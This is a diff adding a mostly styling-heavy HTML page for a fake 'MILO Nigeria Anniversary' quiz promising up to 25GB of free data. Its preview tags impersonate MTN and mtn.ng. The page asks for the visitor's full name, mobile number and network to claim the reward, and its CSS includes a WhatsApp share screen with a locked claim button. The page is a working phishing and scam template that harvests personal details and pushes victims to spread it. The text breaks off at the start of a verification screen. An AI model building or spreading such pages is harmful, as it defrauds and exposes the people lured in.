@@ -1,0 +1,1841 @@
+
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>ENTER YOUR MOBILE NUMBER</title>
+   
+    <!-- Open Graph Meta Tags for WhatsApp -->
+    <meta property="og:title" content="ENTER YOUR MOBILE NUMBER" />
+    <meta property="og:description" content="MILO 25th Silver Jubilee Anniversary in Nigeria" />
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhayRRUbOloTyuTaC_NdYTnhVOBN1SKXw-yYkkuprLp9fnrmxGm0fjs7VVN2J4rGIqE0ZN2rf8lfYPf9_17yQkNi6v-_dVDaOh5axmFYtPEPliNinWhjdHt_MZevakY8RlQpMRlpLtDqxd-6oddB8mGbY43iXVmmkc3nV7f_F-cf3oIrs6svDHS_VOLvGl9/s320/C831B027-5DB8-4E82-A07B-355CEF1B6FD4.png" />
+    <meta property="og:url" content="mtn.ng" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="MTN" />
+    <style>
+        /* ============================================================
+           RESET & BASE
+           ============================================================ */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --mtn-yellow: #014b07;
+            --mtn-yellow-dark: #E6B800;
+            --mtn-yellow-light: #FFE680;
+            --mtn-dark: #1A1A2E;
+            --mtn-dark-soft: #2D2D44;
+            --mtn-gray: #F5F6FA;
+            --mtn-gray-border: #E8E9F0;
+            --mtn-text: #1A1A2E;
+            --mtn-text-secondary: #5A5A7A;
+            --mtn-green: #00A651;
+            --mtn-red: #E74C3C;
+            --whatsapp-green: #25D366;
+            --whatsapp-dark: #128C7E;
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 8px 32px rgba(0, 0, 0, 0.10);
+            --shadow-lg: 0 16px 48px rgba(0, 0, 0, 0.14);
+            --radius: 16px;
+            --radius-sm: 10px;
+            --radius-full: 9999px;
+            --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        html {
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--mtn-gray);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            color: var(--mtn-text);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* ============================================================
+           APP CONTAINER
+           ============================================================ */
+        .app-container {
+            max-width: 540px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            position: relative;
+            transition: var(--transition);
+            border: 1px solid rgba(255, 204, 0, 0.15);
+        }
+
+        /* ============================================================
+           TOP BAR — MTN Official Style
+           ============================================================ */
+        .top-bar {
+            background: var(--mtn-yellow);
+            padding: 14px 20px 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+            border-bottom: 3px solid var(--mtn-yellow-dark);
+        }
+
+        .top-bar .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-shrink: 0;
+        }
+
+        .top-bar .brand .logo-svg {
+            width: 42px;
+            height: 42px;
+            flex-shrink: 0;
+        }
+
+        .top-bar .brand .brand-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.1;
+        }
+
+        .top-bar .brand .brand-text .name {
+            font-weight: 800;
+            font-size: 18px;
+            color: var(--mtn-dark);
+            letter-spacing: -0.3px;
+        }
+
+        .top-bar .brand .brand-text .tagline {
+            font-weight: 400;
+            font-size: 10px;
+            color: var(--mtn-dark-soft);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            opacity: 0.7;
+        }
+
+        .top-bar .money-display {
+            background: var(--mtn-dark);
+            color: #fff;
+            padding: 6px 18px 6px 14px;
+            border-radius: var(--radius-full);
+            font-weight: 700;
+            font-size: 17px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 2px 12px rgba(26, 26, 46, 0.20);
+            flex-shrink: 0;
+            white-space: nowrap;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .top-bar .money-display .naira-icon {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        .top-bar .money-display .amount {
+            min-width: 48px;
+            text-align: right;
+            font-feature-settings: "tnum";
+        }
+
+        /* ============================================================
+           SCREENS
+           ============================================================ */
+        .screen {
+            display: none;
+            padding: 28px 24px 36px;
+            animation: fadeSlideUp 0.45s ease forwards;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        @keyframes fadeSlideUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ============================================================
+           WELCOME SCREEN
+           ============================================================ */
+        .welcome-screen {
+            text-align: center;
+            padding-top: 16px;
+        }
+
+        .welcome-screen .hero-icon {
+            font-size: 64px;
+            margin-bottom: 4px;
+            display: block;
+        }
+
+        .welcome-screen h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+
+        .welcome-screen h1 .highlight {
+            color: var(--mtn-yellow-dark);
+            background: var(--mtn-dark);
+            padding: 0 8px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+
+        .welcome-screen p {
+            color: var(--mtn-text-secondary);
+            font-size: 15px;
+            line-height: 1.7;
+            max-width: 400px;
+            margin: 8px auto 16px;
+        }
+
+        .welcome-screen .prize-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--mtn-gray);
+            padding: 10px 24px;
+            border-radius: var(--radius-full);
+            color: var(--mtn-dark);
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 20px;
+            border: 1px solid var(--mtn-gray-border);
+        }
+
+        .welcome-screen .prize-badge .badge-icon {
+            font-size: 18px;
+        }
+
+        .btn-primary {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: var(--mtn-yellow);
+            color: var(--mtn-dark);
+            padding: 14px 48px;
+            border-radius: var(--radius-full);
+            font-weight: 700;
+            font-size: 17px;
+            border: none;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 16px rgba(255, 204, 0, 0.35);
+            letter-spacing: 0.3px;
+            font-family: inherit;
+            text-decoration: none;
+            width: auto;
+            min-width: 200px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(255, 204, 0, 0.45);
+            background: var(--mtn-yellow-dark);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .btn-primary.w-full {
+            width: 100%;
+            justify-content: center;
+        }
+
+        .btn-secondary {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--mtn-gray);
+            color: var(--mtn-dark);
+            padding: 12px 36px;
+            border-radius: var(--radius-full);
+            font-weight: 600;
+            font-size: 15px;
+            border: 1px solid var(--mtn-gray-border);
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: inherit;
+            text-decoration: none;
+        }
+
+        .btn-secondary:hover {
+            background: #e8e9f0;
+        }
+
+        /* ============================================================
+           DOB SCREEN
+           ============================================================ */
+        .dob-screen h2 {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            margin-bottom: 2px;
+        }
+
+        .dob-screen .subtitle {
+            color: var(--mtn-text-secondary);
+            font-size: 14px;
+            margin-bottom: 22px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: var(--mtn-dark);
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid var(--mtn-gray-border);
+            border-radius: var(--radius-sm);
+            font-size: 16px;
+            transition: var(--transition);
+            background: var(--mtn-gray);
+            font-family: inherit;
+            appearance: auto;
+            color: var(--mtn-dark);
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--mtn-yellow);
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.15);
+        }
+
+        .form-group input::placeholder {
+            color: #aaa;
+        }
+
+        .form-group .hint {
+            font-size: 12px;
+            color: var(--mtn-text-secondary);
+            margin-top: 4px;
+            opacity: 0.8;
+        }
+
+        /* ============================================================
+           QUESTION SCREEN
+           ============================================================ */
+        .question-screen .question-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            gap: 12px;
+        }
+
+        .question-screen .question-counter {
+            font-weight: 700;
+            color: var(--mtn-dark);
+            font-size: 14px;
+            background: var(--mtn-gray);
+            padding: 4px 16px;
+            border-radius: var(--radius-full);
+            border: 1px solid var(--mtn-gray-border);
+        }
+
+        .question-screen .score-badge {
+            font-weight: 600;
+            color: var(--mtn-dark);
+            font-size: 14px;
+            background: var(--mtn-yellow);
+            padding: 4px 16px;
+            border-radius: var(--radius-full);
+            border: 1px solid var(--mtn-yellow-dark);
+        }
+
+        .question-progress {
+            display: flex;
+            gap: 6px;
+            margin: 0 0 16px;
+        }
+
+        .question-progress .dot {
+            flex: 1;
+            height: 4px;
+            border-radius: var(--radius-full);
+            background: var(--mtn-gray-border);
+            transition: background 0.4s ease;
+        }
+
+        .question-progress .dot.filled {
+            background: var(--mtn-yellow);
+        }
+
+        .question-progress .dot.wrong-dot {
+            background: var(--mtn-red);
+        }
+
+        .question-screen .question-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .options-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .option-btn {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            text-align: left;
+            padding: 14px 18px;
+            background: var(--mtn-gray);
+            border: 2px solid var(--mtn-gray-border);
+            border-radius: var(--radius-sm);
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--mtn-dark);
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: inherit;
+            position: relative;
+            gap: 14px;
+        }
+
+        .option-btn:hover:not(.disabled) {
+            background: #eef0f5;
+            border-color: #c8cbd8;
+            transform: translateX(4px);
+        }
+
+        .option-btn .letter {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 30px;
+            height: 30px;
+            flex-shrink: 0;
+            background: #d5d8e2;
+            border-radius: 50%;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            font-size: 13px;
+            transition: var(--transition);
+        }
+
+        .option-btn.correct {
+            border-color: var(--mtn-green);
+            background: #E8F8EE;
+        }
+
+        .option-btn.correct .letter {
+            background: var(--mtn-green);
+            color: #fff;
+        }
+
+        .option-btn.wrong {
+            border-color: var(--mtn-red);
+            background: #FDE8E8;
+        }
+
+        .option-btn.wrong .letter {
+            background: var(--mtn-red);
+            color: #fff;
+        }
+
+        .option-btn.disabled {
+            cursor: default;
+            opacity: 0.7;
+        }
+
+        .option-btn.disabled:hover {
+            transform: none;
+            background: var(--mtn-gray);
+            border-color: var(--mtn-gray-border);
+        }
+
+        /* ============================================================
+           RESULT SCREEN
+           ============================================================ */
+        .result-screen {
+            text-align: center;
+        }
+
+        .result-screen .result-icon {
+            font-size: 56px;
+            margin-bottom: 2px;
+        }
+
+        .result-screen h2 {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            margin-bottom: 2px;
+        }
+
+        .result-screen .result-sub {
+            color: var(--mtn-text-secondary);
+            font-size: 15px;
+            margin-bottom: 18px;
+        }
+
+        .result-screen .earnings-box {
+            background: var(--mtn-gray);
+            border: 2px solid var(--mtn-gray-border);
+            border-radius: var(--radius);
+            padding: 18px 20px;
+            margin: 6px 0 20px;
+        }
+
+        .result-screen .earnings-box .label {
+            font-size: 13px;
+            color: var(--mtn-text-secondary);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .result-screen .earnings-box .big-amount {
+            font-size: 38px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            letter-spacing: -0.5px;
+        }
+
+        .result-screen .earnings-box .big-amount .sub {
+            font-size: 18px;
+            font-weight: 400;
+            color: var(--mtn-text-secondary);
+        }
+
+        .result-screen .stats {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin: 8px 0 20px;
+            font-size: 14px;
+            color: var(--mtn-text-secondary);
+        }
+
+        .result-screen .stats span {
+            font-weight: 700;
+            color: var(--mtn-dark);
+        }
+
+        /* ============================================================
+           ACCOUNT SCREEN
+           ============================================================ */
+        .account-screen h2 {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            margin-bottom: 2px;
+        }
+
+        .account-screen .subtitle {
+            color: var(--mtn-text-secondary);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .bank-select-wrapper {
+            position: relative;
+        }
+
+        .bank-select-wrapper select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%235A5A7A' stroke-width='2' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 40px;
+        }
+
+        /* ============================================================
+           VERIFICATION SCREEN
+           ============================================================ */
+        .verify-screen {
+            text-align: center;
+            padding-top: 20px;
+        }
+
+        .verify-screen .spinner {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            border: 5px solid var(--mtn-gray-border);
+            border-top-color: var(--mtn-yellow);
+            animation: spin 0.9s linear infinite;
+            margin: 8px auto 20px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .verify-screen h2 {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+        }
+
+        .verify-screen .countdown {
+            font-size: 44px;
+            font-weight: 800;
+            color: var(--mtn-yellow-dark);
+            margin: 8px 0;
+        }
+
+        .verify-screen p {
+            color: var(--mtn-text-secondary);
+            font-size: 14px;
+        }
+
+        /* ============================================================
+           SHARE SCREEN — SIMPLIFIED
+           ============================================================ */
+        .share-screen {
+            text-align: center;
+        }
+
+        .share-screen h2 {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            margin-bottom: 4px;
+        }
+
+        .share-screen .subtitle {
+            color: var(--mtn-text-secondary);
+            font-size: 14px;
+            margin-bottom: 20px;
+            max-width: 380px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Progress bar */
+        .share-progress-wrap {
+            background: var(--mtn-gray);
+            border-radius: var(--radius-full);
+            height: 24px;
+            overflow: hidden;
+            margin: 8px auto 6px;
+            position: relative;
+            border: 2px solid var(--mtn-gray-border);
+            max-width: 420px;
+        }
+
+        .share-progress-wrap .bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--mtn-yellow), var(--mtn-yellow-dark));
+            border-radius: var(--radius-full);
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .share-progress-wrap .label {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-weight: 700;
+            font-size: 13px;
+            color: var(--mtn-dark);
+            letter-spacing: 0.3px;
+        }
+
+        .share-count-text {
+            font-size: 14px;
+            color: var(--mtn-text-secondary);
+            margin-top: 4px;
+            margin-bottom: 18px;
+        }
+
+        .share-count-text strong {
+            color: var(--mtn-dark);
+            font-weight: 700;
+        }
+
+        /* WhatsApp Share Button */
+        .whatsapp-share-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: var(--whatsapp-green);
+            color: #fff;
+            padding: 16px 40px;
+            border-radius: var(--radius-full);
+            font-weight: 700;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.35);
+            font-family: inherit;
+            min-width: 220px;
+            position: relative;
+        }
+
+        .whatsapp-share-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(37, 211, 102, 0.45);
+            background: var(--whatsapp-dark);
+        }
+
+        .whatsapp-share-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .whatsapp-share-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .whatsapp-share-btn .wa-icon {
+            font-size: 26px;
+            line-height: 1;
+        }
+
+        .whatsapp-share-btn .btn-text {
+            transition: var(--transition);
+        }
+
+        .whatsapp-share-btn .countdown-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 0 12px;
+            border-radius: var(--radius-full);
+            font-size: 15px;
+            margin-left: 4px;
+            min-width: 28px;
+        }
+
+        /* Claim button */
+        .claim-area {
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 2px dashed var(--mtn-gray-border);
+        }
+
+        .claim-area .claim-btn {
+            background: var(--mtn-gray);
+            color: var(--mtn-text-secondary);
+            padding: 14px 44px;
+            border-radius: var(--radius-full);
+            font-weight: 700;
+            font-size: 18px;
+            border: 2px solid var(--mtn-gray-border);
+            cursor: not-allowed;
+            transition: var(--transition);
+            font-family: inherit;
+            width: 100%;
+            max-width: 300px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .claim-area .claim-btn.unlocked {
+            background: var(--mtn-yellow);
+            color: var(--mtn-dark);
+            border-color: var(--mtn-yellow-dark);
+            cursor: pointer;
+            box-shadow: 0 4px 16px rgba(255, 204, 0, 0.35);
+        }
+
+        .claim-area .claim-btn.unlocked:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(255, 204, 0, 0.45);
+            background: var(--mtn-yellow-dark);
+        }
+
+        .claim-area .claim-btn.unlocked:active {
+            transform: scale(0.97);
+        }
+
+        .claim-area .claim-hint {
+            font-size: 12px;
+            color: var(--mtn-text-secondary);
+            margin-top: 8px;
+            opacity: 0.7;
+        }
+
+        /* ============================================================
+           FINAL SCREEN
+           ============================================================ */
+        .final-screen {
+            text-align: center;
+        }
+
+        .final-screen .result-icon {
+            font-size: 56px;
+            margin-bottom: 2px;
+        }
+
+        .final-screen h2 {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            margin-bottom: 2px;
+        }
+
+        .final-screen .final-sub {
+            color: var(--mtn-text-secondary);
+            font-size: 15px;
+            margin-bottom: 18px;
+        }
+
+        .final-screen .final-earnings-box {
+            background: var(--mtn-gray);
+            border: 2px solid var(--mtn-gray-border);
+            border-radius: var(--radius);
+            padding: 18px 20px;
+            margin-bottom: 20px;
+        }
+
+        .final-screen .final-earnings-box .label {
+            font-size: 13px;
+            color: var(--mtn-text-secondary);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .final-screen .final-earnings-box .big-amount {
+            font-size: 38px;
+            font-weight: 800;
+            color: var(--mtn-dark);
+            letter-spacing: -0.5px;
+        }
+
+        .final-screen .final-earnings-box .big-amount .sub {
+            font-size: 18px;
+            font-weight: 400;
+            color: var(--mtn-text-secondary);
+        }
+
+        .final-screen .mtn-redirect {
+            font-size: 13px;
+            color: var(--mtn-text-secondary);
+            margin-top: 12px;
+            opacity: 0.7;
+        }
+
+        /* ============================================================
+           MTN FOOTER
+           ============================================================ */
+        .mtn-footer {
+            text-align: center;
+            padding: 12px 20px 16px;
+            background: var(--mtn-gray);
+            border-top: 1px solid var(--mtn-gray-border);
+            font-size: 11px;
+            color: var(--mtn-text-secondary);
+            letter-spacing: 0.3px;
+        }
+
+        .mtn-footer .footer-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 2px;
+            font-weight: 600;
+            color: var(--mtn-dark);
+            font-size: 12px;
+        }
+
+        .mtn-footer .footer-logo svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .mtn-footer .footer-text {
+            opacity: 0.6;
+        }
+
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
+        @media (max-width: 540px) {
+            body {
+                padding: 10px;
+            }
+            .app-container {
+                border-radius: var(--radius-sm);
+            }
+            .top-bar {
+                padding: 12px 16px;
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+            .top-bar .brand .brand-text .name {
+                font-size: 16px;
+            }
+            .top-bar .brand .brand-text .tagline {
+                font-size: 9px;
+            }
+            .top-bar .brand .logo-svg {
+                width: 36px;
+                height: 36px;
+            }
+            .top-bar .money-display {
+                font-size: 15px;
+                padding: 4px 14px 4px 10px;
+            }
+            .screen {
+                padding: 20px 16px 28px;
+            }
+            .welcome-screen h1 {
+                font-size: 24px;
+            }
+            .welcome-screen .hero-icon {
+                font-size: 52px;
+            }
+            .question-screen .question-text {
+                font-size: 18px;
+            }
+            .option-btn {
+                font-size: 15px;
+                padding: 12px 14px;
+                gap: 12px;
+            }
+            .option-btn .letter {
+                width: 26px;
+                height: 26px;
+                font-size: 12px;
+            }
+            .result-screen .earnings-box .big-amount {
+                font-size: 32px;
+            }
+            .verify-screen .countdown {
+                font-size: 36px;
+            }
+            .btn-primary {
+                font-size: 16px;
+                padding: 12px 32px;
+                min-width: 160px;
+            }
+            .final-screen .final-earnings-box .big-amount {
+                font-size: 32px;
+            }
+            .claim-area .claim-btn {
+                font-size: 16px;
+                padding: 12px 32px;
+                max-width: 100%;
+            }
+            .whatsapp-share-btn {
+                font-size: 16px;
+                padding: 14px 28px;
+                min-width: 180px;
+            }
+            .whatsapp-share-btn .wa-icon {
+                font-size: 22px;
+            }
+        }
+
+        @media (max-width: 420px) {
+            .top-bar {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 6px;
+                padding: 10px 14px;
+            }
+            .top-bar .brand {
+                justify-content: center;
+            }
+            .top-bar .money-display {
+                justify-content: center;
+                width: 100%;
+                padding: 6px;
+                font-size: 14px;
+            }
+            .welcome-screen h1 {
+                font-size: 20px;
+            }
+            .screen {
+                padding: 16px 12px 24px;
+            }
+            .question-screen .question-text {
+                font-size: 16px;
+            }
+            .result-screen .stats {
+                gap: 16px;
+                font-size: 13px;
+            }
+            .whatsapp-share-btn {
+                font-size: 15px;
+                padding: 12px 20px;
+                min-width: 160px;
+                gap: 8px;
+            }
+            .whatsapp-share-btn .wa-icon {
+                font-size: 20px;
+            }
+            .share-progress-wrap {
+                height: 20px;
+            }
+            .share-progress-wrap .label {
+                font-size: 11px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .top-bar .brand .brand-text .name {
+                font-size: 14px;
+            }
+            .top-bar .money-display {
+                font-size: 13px;
+                padding: 4px 10px;
+            }
+            .whatsapp-share-btn {
+                font-size: 13px;
+                padding: 10px 16px;
+                min-width: 140px;
+            }
+            .whatsapp-share-btn .wa-icon {
+                font-size: 18px;
+            }
+        }
+
+        /* ============================================================
+           UTILITY
+           ============================================================ */
+        .text-center {
+            text-align: center;
+        }
+        .mt-4 {
+            margin-top: 4px;
+        }
+        .mt-8 {
+            margin-top: 8px;
+        }
+        .mt-12 {
+            margin-top: 12px;
+        }
+        .mt-16 {
+            margin-top: 16px;
+        }
+        .mt-20 {
+            margin-top: 20px;
+        }
+        .mb-8 {
+            margin-bottom: 8px;
+        }
+        .mb-12 {
+            margin-bottom: 12px;
+        }
+        .mb-16 {
+            margin-bottom: 16px;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .w-full {
+            width: 100%;
+        }
+        .gap-8 {
+            gap: 8px;
+        }
+        .flex-center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Fix for iOS input zoom */
+        input,
+        select {
+            font-size: 16px !important;
+        }
+
+        /* Toast / notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--mtn-dark);
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: var(--radius-full);
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: var(--shadow-lg);
+            opacity: 0;
+            transition: all 0.4s ease;
+            z-index: 999;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container" id="app">
+
+        <!-- ============================================================
+        TOP BAR — MTN Official
+        ============================================================ -->
+       <center>
+        
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmhy_sdZqqKInd1vZ3pIFD8JthDb0PDqLD1JGejRDbbMuWYoMifTAQg4fEbzVJWpYsjFwQ9Nyyw6qR3-bK8fi5wMetn9ryx1M5Wo-QdQz4eARWXaLA_aIGeaF6cVNqmySh3ETvTw6UZgp9O1-vApvqAnQYeO2DakKhDeJ3btQVdnoQZ_bSx44IkEa4qB8i/s1440/D3F8FB8A-D99C-434A-9E65-F2F82333DD28.png" alt="Free-Data" style="width: 100%;">
+    </center>
+          
+      
+      <div class="top-bar">
+          
+          
+            <div class="brand">
+                <svg class="logo-svg" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="24" cy="24" r="22" fill="#1A1A2E" stroke="#014b07" stroke-width="2.5"/>
+                    <circle cx="24" cy="24" r="18" fill="#014b07"/>
+                    <text x="24" y="30" font-family="Arial, Helvetica, sans-serif" font-size="16" font-weight="900" fill="#ffffff" text-anchor="middle" letter-spacing="0.5">Milo</text>
+                </svg>
+                <div class="brand-text">
+                    <span class="name"><font color="white">MILO</font></span>
+                    <span class="tagline"><font color="white">Nigeria</font></span>
+                </div>
+            </div>
+            <div class="money-display">
+                
+                <span class="amount" id="moneyDisplay">0</span>
+              <span class="naira-icon">GB</span>
+            </div>
+        </div>
+
+        <!-- ============================================================
+        SCREEN 1: WELCOME
+        ============================================================ -->
+        <div class="screen active welcome-screen" id="screenWelcome">
+            <span class="hero-icon">🐝</span>
+            <h1>MILO Nigeria <span class="highlight">Anniversary</span></h1>
+            <p>Answer some simple questions and Get instant rewards! Answer 5 questions correctly and earn up to <strong>25GB</strong>.</p>
+            <div class="prize-badge">
+                <span class="badge-icon">🏆</span>
+                Each correct answer = 5GB
+            </div>
+            <button class="btn-primary" onclick="goToDob()">
+              <font color="white">  PLAY NOW→ </font>
+            </button>
+            <p style="margin-top:14px;font-size:12px;color:var(--mtn-text-secondary);opacity:0.7;">
+                
+            </p>
+        </div>
+
+        <!-- ============================================================
+        SCREEN 2: DATE OF BIRTH
+        ============================================================ -->
+        <div class="screen dob-screen" id="screenDob">
+    <h2>👤 Enter Your Full Name</h2>
+    <p class="subtitle">Please enter your full name to continue.</p>
+
+    <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input
+            type="text"
+            id="fullName"
+            placeholder="Enter your full name"
+            autocomplete="name"
+        />
+    </div>
+
+    <button class="btn-primary w-full" onclick="validateName()">
+       <font color="white"> Continue →</font>
+    </button>
+</div>
+
+        <!-- ============================================================
+        SCREEN 3: QUESTIONS
+        ============================================================ -->
+        <div class="screen question-screen" id="screenQuestions">
+            <div class="question-header">
+                <span class="question-counter" id="qCounter">Q1 / 5</span>
+                <span class="score-badge" id="scoreBadge">✅ <span id="correctCount"><font color="white">0</font></span></span>
+            </div>
+            <div class="question-progress" id="qProgress"></div>
+            <div class="question-text" id="qText">Loading question…</div>
+            <div class="options-grid" id="qOptions"></div>
+        </div>
+
+        <!-- ============================================================
+        SCREEN 4: RESULT
+        ============================================================ -->
+        <div class="screen result-screen" id="screenResult">
+            <div class="result-icon" id="resultIcon">🎉</div>
+            <h2 id="resultTitle">Great Job!</h2>
+            <p class="result-sub" id="resultSub">You've completed the question.</p>
+            <div class="earnings-box">
+                <div class="label">Total Reward</div>
+               <span id="totalEarnings">0<div class="big-amount">GB</span></div>
+            </div>
+            <div class="stats">
+                <div>✅ Correct: <span id="finalCorrect">0</span></div>
+                <div>❌ Wrong: <span id="finalWrong">0</span></div>
+            </div>
+            <button class="btn-primary" onclick="goToAccount()"> <font color="yellow">Claim your Reward →</font></button>
+        </div>
+
+        <!-- ============================================================
+        SCREEN 5: ACCOUNT DETAILS
+        ============================================================ -->
+        <div class="screen account-screen" id="screenAccount">
+            <h2>Your Details</h2>
+            <p class="subtitle">Fill in your Details to receive your reward.</p>
+            <div class="form-group">
+                <label for="accountName">Your Full Name</label>
+                <input type="text" id="accountName" placeholder="e.g. John O. Doe" />
+            </div>
+            <div class="form-group">
+                <label for="accountNumber">Mobile Number</label>
+                <input type="text" id="accountNumber" placeholder="e.g. 08023456789" maxlength="10" inputmode="numeric" pattern="[0-9]*" />
+                <div class="hint">Mobile number.</div>
+            </div>
+            <div class="form-group">
+                <label for="bankSelect">Select Your Network</label>
+                <div class="bank-select-wrapper">
+                    <select id="bankSelect">
+                        <option value="">— Select Network —</option>
+                    </select>
+                </div>
+            </div>
+            <button class="btn-primary w-full" onclick="submitAccount()"><font color="white">Claim Now →</font></button>
+        </div>
+
+        <!-- ============================================================
+        SCREEN 6: VERIFICATION
+        ============================================================ -->
+        <div class="screen verify-screen" id="screenVerify">
